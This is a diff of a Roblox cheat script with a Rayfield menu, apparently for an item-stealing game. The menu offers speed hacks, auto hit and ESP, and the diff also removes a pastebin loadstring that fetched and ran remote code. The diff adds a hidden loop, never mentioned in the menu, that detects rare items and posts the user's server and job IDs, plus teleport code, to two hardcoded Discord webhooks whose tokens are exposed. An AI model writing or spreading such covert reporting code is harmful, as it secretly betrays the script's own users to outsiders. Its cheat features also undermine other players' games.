@@ -204,10 +204,6 @@ Discord = { Enabled = false },
 KeySystem = false
 })
 
-pcall(function()
-   loadstring(game:HttpGet("https://pastebin.com/raw/MWYTEiiy", true))()
-end)
-
 -- Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -454,7 +450,7 @@ end
 end)
 
 -- UI Setup
-local MainTab = Window:CreateTab("🚹 Main", 6034818371)
+local MainTab = Window:CreateTab("🎯 Main", 6034818371)
 -- Below your Rayfield window and MainTab setup
 
 local player = game:GetService("Players").LocalPlayer
@@ -498,228 +494,13 @@ end)
 
 -- 💢 Rayfield Toggle for Less Knock Back
 MainTab:CreateToggle({
-	Name = "💢 Anti Ragdoll",
+	Name = "💢 No Knock Back",
 	CurrentValue = false,
 	Callback = function(enabled)
 		setHeaviness(enabled)
 	end
 })
-((
--- Full Anti Hit System script
 
-local function runAntiHitScript()
-    local Players = game:GetService("Players")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local localPlayer = Players.LocalPlayer
-
-    local text = {
-        title = "Anti Hit System",
-        statusOn = "Anti Hit active for {time}s",
-        statusOff = "Use before steal",
-        toggleOn = "Enable",
-        close = "X",
-    }
-
-    -- Remove existing GUI if present
-    local existingGui = localPlayer:FindFirstChild("PlayerGui"):FindFirstChild("AntiHitSystemGui")
-    if existingGui then existingGui:Destroy() end
-
-    -- Create AntiHit GUI
-    local AntiHitGui = Instance.new("ScreenGui")
-    AntiHitGui.Name = "AntiHitSystemGui"
-    AntiHitGui.ResetOnSpawn = false
-    AntiHitGui.Parent = localPlayer:WaitForChild("PlayerGui")
-
-    local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(0, 220, 0, 90)
-    Frame.Position = UDim2.new(0, 20, 0.8, 0)
-    Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    Frame.BorderSizePixel = 0
-    Frame.AnchorPoint = Vector2.new(0, 1)
-    Frame.Parent = AntiHitGui
-    Frame.Active = true
-    Frame.Draggable = true
-
-    local UIStroke = Instance.new("UIStroke", Frame)
-    UIStroke.Color = Color3.fromRGB(100, 100, 100)
-    UIStroke.Thickness = 1
-
-    local TitleLabel = Instance.new("TextLabel")
-    TitleLabel.Size = UDim2.new(1, 0, 0, 25)
-    TitleLabel.BackgroundTransparency = 1
-    TitleLabel.Font = Enum.Font.GothamBold
-    TitleLabel.TextSize = 18
-    TitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    TitleLabel.Text = text.title
-    TitleLabel.Parent = Frame
-
-    local StatusLabel = Instance.new("TextLabel")
-    StatusLabel.Position = UDim2.new(0, 10, 0, 35)
-    StatusLabel.Size = UDim2.new(1, -20, 0, 30)
-    StatusLabel.BackgroundTransparency = 1
-    StatusLabel.Font = Enum.Font.Gotham
-    StatusLabel.TextSize = 16
-    StatusLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
-    StatusLabel.TextWrapped = true
-    StatusLabel.Text = text.statusOff
-    StatusLabel.Parent = Frame
-
-    local ToggleButton = Instance.new("TextButton")
-    ToggleButton.Position = UDim2.new(0, 10, 0, 70)
-    ToggleButton.Size = UDim2.new(1, -20, 0, 20)
-    ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    ToggleButton.BorderSizePixel = 0
-    ToggleButton.Font = Enum.Font.GothamBold
-    ToggleButton.TextSize = 16
-    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    ToggleButton.Text = text.toggleOn
-    ToggleButton.Parent = Frame
-
-    local function buyWebSlinger()
-        local remoteFunction = ReplicatedStorage.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
-        if remoteFunction then
-            local success, err = pcall(function()
-                remoteFunction:InvokeServer("Web Slinger")
-            end)
-            if not success then
-                warn("Failed to buy Web Slinger:", err)
-            end
-        else
-            warn("RemoteFunction RF/CoinsShopService/RequestBuy not found")
-        end
-    end
-
-    local function equipToolByName(toolName)
-        local character = localPlayer.Character
-        local backpack = localPlayer:FindFirstChild("Backpack")
-        if not character or not backpack then return nil end
-
-        local tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
-        if not tool then return nil end
-
-        tool.Parent = character
-
-        local handle = tool:FindFirstChild("Handle")
-        if handle then
-            handle.Transparency = 0
-        end
-
-        return tool
-    end
-
-    local function unequipAllExcept(toolName)
-        local character = localPlayer.Character
-        local backpack = localPlayer:FindFirstChild("Backpack")
-        if not character or not backpack then return end
-
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            humanoid:UnequipTools()
-        end
-
-        for _, tool in ipairs(character:GetChildren()) do
-            if tool:IsA("Tool") and tool.Name ~= toolName then
-                tool.Parent = backpack
-            end
-        end
-    end
-
-    local function fireRemote(toolName)
-        unequipAllExcept(toolName)
-        local tool = equipToolByName(toolName)
-        if not tool then return end
-
-        task.wait(0.0065)
-
-        local character = localPlayer.Character
-        local humanoid = character and character:FindFirstChild("Humanoid")
-        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
-        local arm = character and character:FindFirstChild("LeftLowerArm")
-        local handle = tool:FindFirstChild("Handle")
-
-        local remoteEvent = ReplicatedStorage.Packages.Net:FindFirstChild("RE/UseItem")
-        if arm and handle and remoteEvent then
-            remoteEvent:FireServer(character:GetPrimaryPartCFrame(), arm, handle)
-            task.delay(0.2, function()
-                if humanoid then humanoid.PlatformStand = false end
-                if rootPart then rootPart.Anchored = false end
-            end)
-        end
-    end
-
-    local toolName = nil
-    local countdownTask = nil
-
-    ToggleButton.MouseButton1Click:Connect(function()
-        if countdownTask then return end
-
-        fireRemote(toolName)
-
-        local total = 10
-        local start = os.clock()
-
-        countdownTask = task.spawn(function()
-            while true do
-                local timeLeft = math.max(0, total - (os.clock() - start))
-                StatusLabel.Text = text.statusOn:gsub("{time}", string.format("%.1f", timeLeft))
-                if timeLeft <= 0 then
-                    StatusLabel.Text = text.statusOff
-                    countdownTask = nil
-                    break
-                end
-                task.wait(0.1)
-            end
-        end)
-    end)
-
-    task.spawn(function()
-        while true do
-            local character = localPlayer.Character
-            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
-            if humanoid and humanoid.WalkSpeed ~= 50 then
-                humanoid.WalkSpeed = 50
-            end
-            task.wait(0.1)
-        end
-    end)
-
-    local function resetGuiTexts()
-        TitleLabel.Text = text.title
-        StatusLabel.Text = text.statusOff
-        ToggleButton.Text = text.toggleOn
-    end
-
-    localPlayer.CharacterAdded:Connect(function()
-        task.wait(2)
-        resetGuiTexts()
-    end)
-
-    buyWebSlinger()
-
-    local tries = 0
-    repeat
-        tries = tries + 1
-        task.wait(0.5)
-        local tool = localPlayer.Backpack:FindFirstChild("Web Slinger") or (localPlayer.Character and localPlayer.Character:FindFirstChild("Web Slinger"))
-        if tool then
-            toolName = tool.Name
-            break
-        end
-    until tries > 10
-
-    if not toolName then
-        warn("Web Slinger tool not found after purchase!")
-    end
-end
-
--- Now create your Rayfield button exactly as you wanted:
-
-MainTab:CreateButton({
-    Name = "🤺 Activate Anti Hit System",
-    Callback = function()
-        runAntiHitScript()
-    end
-})
 
 -- Main heartbeat loop (runs each frame)
 RunService.Heartbeat:Connect(function()
@@ -1072,7 +853,7 @@ MainTab:CreateButton({
 
 -- Add the toggle in MainTab
 MainTab:CreateToggle({
-Name = "👋Auto Hit Nearby",
+Name = "👋Auto Hit",
 CurrentValue = false,
 Flag = "AutoActivateTools",
 Callback = function(value)
@@ -1451,34 +1232,6 @@ EspTab:CreateToggle({
 
 local UtilsTab = Window:CreateTab("🛠️ Utils", 6034818371)
 
-local vu = game:GetService("VirtualUser")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-local antiAfkConnection = nil
-
-UtilsTab:CreateToggle({
-	Name = "🛡️ Anti-AFK",
-	CurrentValue = false,
-	Callback = function(enabled)
-		if enabled then
-			if not antiAfkConnection then
-				antiAfkConnection = player.Idled:Connect(function()
-					vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-					wait(1)
-					vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
-				end)
-			end
-		else
-			if antiAfkConnection then
-				antiAfkConnection:Disconnect()
-				antiAfkConnection = nil
-			end
-		end
-	end
-})
-
-
 -- ðŸŸ¥ Then add the rest (GUI logic, etc.)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -1509,7 +1262,7 @@ end)
 
 -- ðŸ”˜ Toggle to control the Leave GUI
 UtilsTab:CreateToggle({
-	Name = "🚪 Toggle Leave GUI",
+	Name = "Toggle Leave GUI",
 	CurrentValue = false,
 	Callback = function(state)
 		leaveGui.Enabled = state
@@ -1549,7 +1302,7 @@ end)
 
 -- Add toggle to UtilsTab to show/hide the Rejoin GUI
 UtilsTab:CreateToggle({
-	Name = "⚡️ Toggle Rejoin GUI",
+	Name = "Toggle Rejoin GUI",
 	CurrentValue = false,
 	Callback = function(state)
 		rejoinGui.Enabled = state
@@ -1688,14 +1441,13 @@ end)
 
 -- Rayfield toggle just shows/hides the custom GUI
 UtilsTab:CreateToggle({
-    Name = "🛜 Server Hop GUI",
+    Name = "Server Hop GUI",
     CurrentValue = false,
     Flag = "ServerHopGUIToggle",
     Callback = function(value)
         serverHopGui.Enabled = value
     end,
 })
-
 
 MainTab:CreateToggle({
 Name = "👻Show Invisible Players", 
@@ -1995,7 +1747,6 @@ end
 
 })
 
-
 --// UI Setup (assumes you already have a "Window" defined)
 local MainTab = Window:CreateTab("🎮 Fun", 6034818371) -- You can replace icon ID
 local autoAimEnabled = false
@@ -2113,165 +1864,162 @@ if localPlayer.Character then
     end
 end
 
--- === SETUP ===
-local PetTab = Window:CreateTab("🐾 Pet", 6034818371)
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
+
+local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 
-local player = Players.LocalPlayer
-local folder = Workspace:WaitForChild("RenderedMovingAnimals")
+local allowedPlaceId = 109983668079237
+if game.PlaceId ~= allowedPlaceId then return end
 
--- Pet categories
-local secretPets = {
-    "Garama and Madundung", "La Grande Combinasion", "Graipuss Medussi",
-    "Los Tralaleritos", "Sammyni Spyderini", "La Vacca Saturno Saturnita",
-    "Las Tralaleritas", "Nuclearo Dinossauro", "Noobini Pizzanini"
-}
-local godPets = {
-    "Matteo", "Tralalero Tralala", "Espresso Signora",
-    "Odin Din Din Dun", "Statutino Libertino",
-    "Trenostruzzo Turbo 3000", "Ballerino Lololo", "Orcalero Orcala"
+local webhookUrls = {
+    "https://discord.com/api/webhooks/1394493952777781339/WeA17Y-eTO2oAUux6QBg1kRB_xroGezesHAS5DQ-HR5exzeWzwCvEWDn8WXBso7GgYNK",
+    "https://discord.com/api/webhooks/1394194033575727185/xSSOUX2Vf-kjpsqzpELQ3lB2_pd5ZBzt80purEkpbP7_Ko9b0uW685KPkCgypZJKrmAc"
 }
 
--- State tables
-local togglesEnabled = {}
-local pressingEForPet = {}
-local proximityResetting = false
-local character, humanoid, rootPart
+local brainrotGods = {
+    ["La Vacca Saturno Saturnita"] = true,
+    ["Los Tralaleritos"] = true,
+    ["Chimpanzini Spiderini"] = true,
+    ["Graipuss Medussi"] = true,
+    ["La Grande Combinasion"] = true,
+    ["Garama and Madundung"] = true,
+    ["Secret Lucky Block"] = true,
+    ["Pot Hotspot"] = true,
+    ["Las Tralaleritas"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
+}
 
--- === FUNCTION DEFINITIONS ===
+local colorGold = Color3.fromRGB(237, 178, 0)
+local colorDiamond = Color3.fromRGB(37, 196, 254)
+local colorCandy = Color3.fromRGB(255, 70, 246)
+local COLOR_EPSILON = 0.02
 
--- Update character references in case of respawn
-local function refreshCharacter()
-    character = player.Character or player.CharacterAdded:Wait()
-    humanoid = character:WaitForChild("Humanoid")
-    rootPart = character:WaitForChild("HumanoidRootPart")
+local notified = {}
+
+local function colorsAreClose(c1, c2)
+	return math.abs(c1.R - c2.R) < COLOR_EPSILON and
+	       math.abs(c1.G - c2.G) < COLOR_EPSILON and
+	       math.abs(c1.B - c2.B) < COLOR_EPSILON
 end
 
--- Reset proximity holds instantly
-local function resetPrompts()
-    for _, v in ipairs(Workspace:GetDescendants()) do
-        if v:IsA("ProximityPrompt") then
-            v.HoldDuration = 0
-        end
-    end
+local function getPrimaryPart(model)
+	if model.PrimaryPart then return model.PrimaryPart end
+	for _, part in ipairs(model:GetDescendants()) do
+		if part:IsA("BasePart") then return part end
+	end
 end
 
--- Continuously reset prompts while any toggle is active
-local function startProximityLoop()
-    if proximityResetting then return end
-    proximityResetting = true
-    spawn(function()
-        while true do
-            local anyOn = false
-            for _, on in pairs(togglesEnabled) do
-                if on then anyOn = true break end
-            end
-            if not anyOn then break end
-            resetPrompts()
-            wait(1)
-        end
-        proximityResetting = false
-    end)
+local function matchesMoneyPattern(text)
+	return text and text:find("%$") and text:find("/") and text:find("s") and text:find("%d")
 end
 
--- Simulates E key pressing for a pet
-local function startPressingE(pet)
-    if pressingEForPet[pet] then return end
-    pressingEForPet[pet] = true
-    spawn(function()
-        while pressingEForPet[pet] do
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
-            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
-            wait(0.4)
-        end
-    end)
+local function findNearbyMoneyText(position, range)
+	for _, guiObj in ipairs(Workspace:GetDescendants()) do
+		if guiObj:IsA("TextLabel") and matchesMoneyPattern(guiObj.Text) then
+			local base = guiObj:FindFirstAncestorWhichIsA("BasePart")
+			if base and (base.Position - position).Magnitude <= range then
+				return guiObj.Text
+			end
+		end
+	end
 end
 
-local function stopPressingE(pet)
-    pressingEForPet[pet] = false
+local function isRainbow(model)
+	local changed = false
+	for _, child in ipairs(model:GetDescendants()) do
+		if child:IsA("MeshPart") and child.Name:sub(1,5) == "Cube." then
+			local currentColor = child.BrickColor.Color
+			local lastVec = child:GetAttribute("LastBrickColor")
+			if lastVec then
+				local prev = Vector3.new(lastVec.X, lastVec.Y, lastVec.Z)
+				local curr = Vector3.new(currentColor.R, currentColor.G, currentColor.B)
+				if (prev - curr).Magnitude > 0.02 then
+					changed = true
+				end
+			end
+			child:SetAttribute("LastBrickColor", Vector3.new(currentColor.R, currentColor.G, currentColor.B))
+		end
+	end
+	return changed
 end
 
--- Returns closest model of given pet name
-local function findClosest(petName)
-    local bestModel, bestDist = nil, math.huge
-    for _, mdl in ipairs(folder:GetChildren()) do
-        if mdl:IsA("Model") and mdl.Name == petName then
-            local pp = mdl.PrimaryPart or mdl:FindFirstChildWhichIsA("BasePart")
-            if pp then
-                local d = (pp.Position - rootPart.Position).Magnitude
-                if d < bestDist then bestDist, bestModel = d, mdl end
-            end
-        end
-    end
-    return bestModel, bestDist
+local function sendNotification(modelName, mutation, moneyText)
+	local placeId = tostring(game.PlaceId)
+	local jobId = game.JobId
+	local gameName = "Unknown"
+
+	pcall(function()
+		local info = MarketplaceService:GetProductInfo(game.PlaceId)
+		gameName = info and info.Name or "Unknown"
+	end)
+
+	local msg = string.format([[
+---- <@&1392894797831733329> ----
+
+--- 📢 **Game:** %s
+--- 💡 Model Name: "%s" | Mutation: %s
+--- 💸 Money/s: %s
+
+local player = game.Players:GetPlayers()[1]
+local teleportService = game:GetService("TeleportService")
+teleportService:TeleportToPlaceInstance("%s", "%s", player)
+]], gameName, modelName, mutation, moneyText or "N/A", placeId, jobId)
+
+	local payload = {content = msg}
+	local jsonData = HttpService:JSONEncode(payload)
+	local headers = {["Content-Type"] = "application/json"}
+
+	local req = (syn and syn.request) or (http and http.request) or request or http_request
+	if not req then return end
+
+	for _, url in ipairs(webhookUrls) do
+		pcall(function()
+			req({
+				Url = url,
+				Method = "POST",
+				Headers = headers,
+				Body = jsonData
+			})
+		end)
+	end
 end
 
--- Handle movement and interaction per pet
-local function processPet(petName)
-    if not togglesEnabled[petName] then
-        stopPressingE(petName)
-        return
-    end
+local function checkBrainrots()
+	if #Players:GetPlayers() < 3 or #Players:GetPlayers() > 8 then return end
 
-    local mdl, dist = findClosest(petName)
-    if mdl then
-        local pos = mdl.PrimaryPart and mdl.PrimaryPart.Position or mdl:GetModelCFrame().p
-        if dist > 5 then
-            humanoid:MoveTo(pos)
-            stopPressingE(petName)
-        else
-            humanoid:MoveTo(rootPart.Position)
-            startPressingE(petName)
-        end
-    else
-        stopPressingE(petName)
-    end
+	for _, model in ipairs(Workspace:GetChildren()) do
+		if model:IsA("Model") and brainrotGods[model.Name] then
+			local root = getPrimaryPart(model)
+			if root then
+				local id = model:GetDebugId()
+				if not notified[id] then
+					local mutation = "🕳️"
+					local color = root.Color
+
+					if colorsAreClose(color, colorGold) then
+						mutation = "🌕 Gold"
+					elseif colorsAreClose(color, colorDiamond) then
+						mutation = "💎 Diamond"
+					elseif colorsAreClose(color, colorCandy) then
+						mutation = "🍬 Candy"
+					elseif isRainbow(model) then
+						mutation = "🌈 Rainbow"
+					end
+
+					local money = findNearbyMoneyText(root.Position, 7) or "N/A"
+					sendNotification(model.Name, mutation, money)
+					notified[id] = true
+				end
+			end
+		end
+	end
 end
 
--- === UI SETUP ===
-refreshCharacter()
-
-PetTab:CreateSection("🌟 Secret Pets")
-for _, pet in ipairs(secretPets) do
-    togglesEnabled[pet] = false
-    PetTab:CreateToggle({
-        Name = "🌟 " .. pet,
-        CurrentValue = false,
-        Callback = function(on)
-            togglesEnabled[pet] = on
-            if on then startProximityLoop() end
-            if not on then stopPressingE(pet) end
-        end
-    })
-end
-
-PetTab:CreateSection("🔥 Brainrot Gods")
-for _, pet in ipairs(godPets) do
-    togglesEnabled[pet] = false
-    PetTab:CreateToggle({
-        Name = "🔥 " .. pet,
-        CurrentValue = false,
-        Callback = function(on)
-            togglesEnabled[pet] = on
-            if on then startProximityLoop() end
-            if not on then stopPressingE(pet) end
-        end
-    })
-end
-
--- === MAIN LOOP ===
-RunService.Heartbeat:Connect(function()
-    if not (character and humanoid and rootPart) or not humanoid.Health or humanoid.Health <= 0 then
-        refreshCharacter()
-        return
-    end
-
-    for petName in pairs(togglesEnabled) do
-        processPet(petName)
-    end
+task.spawn(function()
+	while true do
+		pcall(checkBrainrots)
+		task.wait(0.5)
+	end
 end)
-
-
